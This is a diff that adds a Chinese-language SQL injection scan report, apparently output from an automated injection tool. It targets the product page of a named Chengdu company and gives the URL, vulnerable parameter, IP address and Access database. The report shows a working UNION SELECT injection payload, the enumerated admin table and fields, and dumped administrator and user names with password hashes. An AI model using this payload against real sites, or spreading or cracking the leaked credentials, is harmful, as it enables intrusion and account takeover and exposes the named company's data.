@@ -1,0 +1,34 @@
+■漏洞信息:============================================================
+ ·URL:http://www.cnyhy.com/productshow.asp?id=25
+ ·页面标题：对讲型流媒体2.4G&5.8G无线网络摄象机-TS820NW-成都永辉园科技有限公司
+ ·参数:id=25
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:121.61.118.139
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Cache-Control: private
+Connection: close
+Date: Mon, 22 Aug 2011 09:33:38 GMT
+Content-Length: 58207
+Content-Type: text/html
+Expires: Mon, 22 Aug 2011 09:33:38 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+
+
+联合查询列数: 总共= 20  显示的列= 6
+联合查询SQL: and 3=8 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from MSysAccessObjects
+找到表:admin
+找到表:user
+找到字段:admin.id
+找到字段:admin.username
+找到字段:admin.password
+------------------------------------------------------------
+username		password		
+admin		b59d251571c55a79
+sfmlr520		237bf19668609cf3
+sfmlr521		f3c658c060b3565a
